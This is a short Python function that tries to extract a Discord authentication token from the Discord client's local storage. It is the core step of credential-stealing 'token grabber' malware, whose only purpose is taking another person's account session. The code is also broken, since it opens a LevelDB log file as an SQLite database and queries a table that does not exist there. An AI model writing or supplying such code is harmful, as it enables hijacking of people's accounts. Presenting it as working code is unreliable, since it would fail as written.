import sqlite3
from pathlib import Path

# Function to extract Discord token from the local storage
def extract_discord_token(token_path):
    # Connect to the SQLite database
    conn = sqlite3.connect(token_path / 'Local Storage' / 'leveldb' / '000003.log')
    cursor = conn.cursor()

    # Query to extract the token
    cursor.execute("SELECT value FROM items WHERE key = 'token'")
    result = cursor.fetchone()

    # Close the database connection
    conn.close()

    if result:
        return result[0]
    else:
        return None